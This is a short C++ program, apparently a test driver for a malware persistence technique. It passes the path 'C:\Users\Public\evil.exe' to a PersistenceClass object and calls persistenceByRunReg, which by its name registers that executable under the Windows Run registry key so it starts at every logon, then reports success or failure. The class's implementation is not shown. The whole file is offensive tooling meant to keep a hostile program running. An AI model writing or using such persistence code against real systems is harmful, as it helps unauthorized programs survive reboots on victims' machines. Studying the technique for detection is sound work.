#include <windows.h>
#include <string.h>
#include <iostream>
#include "PersistenceClass.h"
 
using namespace std;
 
int main(){
    bool result;
    string exePath = "C:\\Users\\Public\\evil.exe";
 
    PersistenceClass persistenceObj(exePath);
    result = persistenceObj.persistenceByRunReg();
    if (result) {
        cout << "Persistence by Run Reg OK" << endl;
    } else {
        cout << "Persistence by Run Reg FAIL" << endl;
    }
    return 0;
}